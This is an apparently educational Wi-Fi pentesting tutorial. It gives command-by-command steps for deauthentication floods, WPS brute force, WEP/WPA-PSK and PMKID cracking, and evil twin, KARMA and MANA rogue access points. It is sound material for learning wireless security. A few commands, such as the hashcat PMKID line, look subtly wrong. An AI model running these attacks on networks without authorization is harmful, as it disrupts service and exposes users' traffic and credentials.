# Wi-Fi Pentesting

In the modern age, wireless networks (WiFi) have become ubiquitous, facilitating seamless internet connectivity across devices. However, this convenience comes with significant security challenges. Penetration testing (pentesting) WiFi networks is crucial for identifying vulnerabilities and strengthening network defenses. This guide aims to provide a comprehensive step-by-step approach to WiFi pentesting, targeted at both beginners and intermediate users. We’ll cover essential WiFi commands, tools available in Kali Linux, and a variety of attacks to help you get started.

![WiFi Pentesting](https://media.licdn.com/dms/image/v2/D5622AQGwE3-mPWJI4Q/feedshare-shrink_2048_1536/feedshare-shrink_2048_1536/0/1680676985761?e=2147483647&v=beta&t=1Wnu80qJENz4M0DrdHcln7etEkmq7rkqQCBYg9T2qxY "WiFi Pentesting")

## Understanding WiFi Basics

### WiFi Basics

Before diving into pentesting, it’s essential to understand some basic WiFi concepts and commands. WiFi networks operate on different channels within the 2.4 GHz and 5 GHz bands. Each WiFi network is identified by its Service Set Identifier (SSID). The primary security protocols used in WiFi networks include WEP, WPA/WPA2-PSK, and WPA3.

### Common WiFi Commands

Here are some fundamental commands used in WiFi pentesting:

- `ifconfig`: Displays network interfaces and their configurations.
- `iwconfig`: Similar to ifconfig but specifically for wireless interfaces.
- `airmon-ng`: Used to manage wireless interfaces.
- `airodump-ng`: Captures raw 802.11 frames.
- `aireplay-ng`: Injects frames into a network.
- `aircrack-ng`: Cracks WEP and WPA-PSK keys.

## Tools in Kali Linux for WiFi Pentesting

Kali Linux is a go-to distribution for penetration testers due to its wide array of pre-installed tools. Here are some essential tools for WiFi pentesting:

- **Aircrack-ng Suite**: A set of tools for auditing wireless networks.
- **Reaver**: A tool for WPS brute force attacks.
- **Wireshark**: A network protocol analyzer.
- **Wifite**: An automated wireless attack tool.
- **Bettercap**: A network attack and monitoring tool.
- **Kismet**: A network detector, packet sniffer, and intrusion detection system.

## Types of WiFi Attacks

### Denial of Service (DOS) Attacks

DOS attacks aim to make a network unavailable to its intended users. One common method is by flooding the network with deauthentication packets.

#### Step-by-Step Guide for DOS Attack

1. **Set Up Monitor Mode**:
    ```bash
    airmon-ng start wlan0
    ```

2. **Capture Packets**:
    ```bash
    airodump-ng wlan0mon
    ```

3. **Send Deauthentication Packets**:
    ```bash
    aireplay-ng --deauth 0 -a [Router BSSID] wlan0mon
    ```

### Deauthentication Attack

A deauthentication attack forces clients to disconnect from a network, which can be useful for capturing handshakes.

#### Performing a Deauthentication Attack

1. **Capture Handshake**:
    ```bash
    airodump-ng --bssid [Router BSSID] --channel [Channel] -w [Output file] wlan0mon
    ```

2. **Send Deauth Packets**:
    ```bash
    aireplay-ng --deauth 10 -a [Router BSSID] -c [Client MAC] wlan0mon
    ```

### WPS Brute Force Attack

WPS (WiFi Protected Setup) brute force attacks target the WPS PIN to gain access to the network.

#### Using Reaver for WPS Attack

1. **Start Monitor Mode**:
    ```bash
    airmon-ng start wlan0
    ```

2. **Scan for WPS-Enabled Networks**:
    ```bash
    wash -i wlan0mon
    ```

3. **Run Reaver**:
    ```bash
    reaver -i wlan0mon -b [Router BSSID] -vv
    ```

### Cracking WEP

WEP is outdated and insecure, but some networks still use it. Cracking WEP involves capturing enough data packets to retrieve the encryption key.

#### Cracking WEP Step-by-Step

1. **Capture Data**:
    ```bash
    airodump-ng --bssid [Router BSSID] --channel [Channel] -w [Output file] wlan0mon
    ```

2. **Inject ARP Packets**:
    ```bash
    aireplay-ng --arpreplay -b [Router BSSID] -h [Your MAC] wlan0mon
    ```

3. **Crack the Key**:
    ```bash
    aircrack-ng [Output file]-01.cap
    ```

### Cracking WPA/WPA2-PSK

Cracking WPA/WPA2-PSK involves capturing the handshake and using a dictionary attack to find the passphrase.

#### Capturing Handshake and Cracking WPA/WPA2-PSK

1. **Capture Handshake**:
    ```bash
    airodump-ng --bssid [Router BSSID] --channel [Channel] -w [Output file] wlan0mon
    ```

2. **Send Deauth Packets**:
    ```bash
    aireplay-ng --deauth 10 -a [Router BSSID] -c [Client MAC] wlan0mon
    ```

3. **Crack Handshake**:
    ```bash
    aircrack-ng -w [Wordlist] -b [Router BSSID] [Output file]-01.cap
    ```

### PMKID Attack

The PMKID attack is a recent method that targets the RSN PMKID from a WPA2 handshake.

#### Executing a PMKID Attack

1. **Capture PMKID**:
    ```bash
    hcxdumptool -i wlan0mon -o [Output file] --enable_status=1
    ```

2. **Convert PMKID**:
    ```bash
    hcxpcaptool -z [PMKID file] [Output file]
    ```

3. **Crack PMKID**:
    ```bash
    hashcat -m 16800 -a 3 [PMKID file] [Wordlist]
    ```

### WPA Enterprise (MGT) Attack

WPA Enterprise uses a RADIUS server for authentication. Attacking this involves capturing EAP packets and attempting to crack them.

#### Capturing EAP Packets

1. **Capture Packets**:
    ```bash
    airodump-ng --bssid [Router BSSID] --channel [Channel] -w [Output file] wlan0mon
    ```

2. **Deauth Client**:
    ```bash
    aireplay-ng --deauth 10 -a [Router BSSID] -c [Client MAC] wlan0mon
    ```

3. **Crack EAP**:
    ```bash
    asleap -r [Output file]-01.cap -W [Wordlist]
    ```

### Client Attacks

Client attacks target the devices connected to a WiFi network rather than the access point itself. These can include exploiting vulnerabilities in the client devices or manipulating their connections.

#### Setting Up a Simple AP with Redirection to the Internet

1. **Create a Hostapd Configuration File**:
    ```bash
    interface=wlan0
    driver=nl80211
    ssid=TestAP
    channel=1
    ```

2. **Start Hostapd**:
    ```bash
    hostapd /etc/hostapd/hostapd.conf
    ```

3. **Set Up NAT**:
    ```bash
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    sysctl -w net.ipv4.ip_forward=1
    ```

### Evil Twin Attack

An Evil Twin attack involves setting up a rogue access point with the same SSID as the target network to trick clients into connecting to it.

#### Setting Up an Evil Twin

1. **Create Fake AP**:
    ```bash
    airbase-ng -e [SSID] -c [Channel] wlan0mon
    ```

2. **Set Up NAT**:
    ```bash
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    sysctl -w net.ipv4.ip_forward=1
    ```

### KARMA Attack

The KARMA attack exploits the tendency of devices to automatically connect to known networks. By broadcasting SSIDs that devices have previously connected to, an attacker can lure devices into connecting.

#### Performing a KARMA Attack

1. **Set Up KARMA AP**:
    ```bash
    bettercap -iface wlan0 --wifi-ap.ssid "FreeWifi" --wifi-ap.karma
    ```

### MANA Attack

MANA is an enhanced version of the KARMA attack, with additional capabilities for capturing credentials.

#### Executing a MANA Attack

1. **Start MANA**:
    ```bash
    hostapd-mana /etc/hostapd-mana.conf
    ```

2. **Capture Traffic**:
    ```bash
    tcpdump -i wlan0 -w mana.pcap
    ```

### Loud MANA Attack

Loud MANA is an aggressive variant of the MANA attack, designed to forcefully deauthenticate clients from legitimate APs to connect to the rogue AP.

#### Performing a Loud MANA Attack

1. **Start Loud MANA**:
    ```bash
    hostapd-mana /etc/hostapd-mana-loud.conf
    ```

2. **Capture Traffic**:
    ```bash
    tcpdump -i wlan0 -w loud-mana.pcap
    ```

### Known Beacons Attack

In this attack, beacons of well-known networks are broadcasted to deceive clients into connecting.

#### Executing a Known Beacons Attack

1. **Broadcast Known Beacons**:
    ```bash
    mdk3 wlan0 b -v [SSID list file]
    ```

### Wi-Fi Direct

Wi-Fi Direct allows devices to connect directly without a router. Attacking Wi-Fi Direct involves exploiting vulnerabilities in the protocol or connected devices.

#### Wi-Fi Direct Pentesting

1. **Discover Wi-Fi Direct Devices**:
    ```bash
    wpa_cli p2p_find
    ```

2. **Connect to a Device**:
    ```bash
    wpa_cli p2p_connect [Device MAC] pbc
    ```

---

Pentesting WiFi networks is an essential skill for identifying and mitigating security risks. By following the comprehensive steps and utilizing the tools outlined in this guide, beginners and intermediate users can effectively assess the security of wireless networks. Always ensure to have proper authorization before conducting any pentesting activities and use these skills responsibly to improve network security.
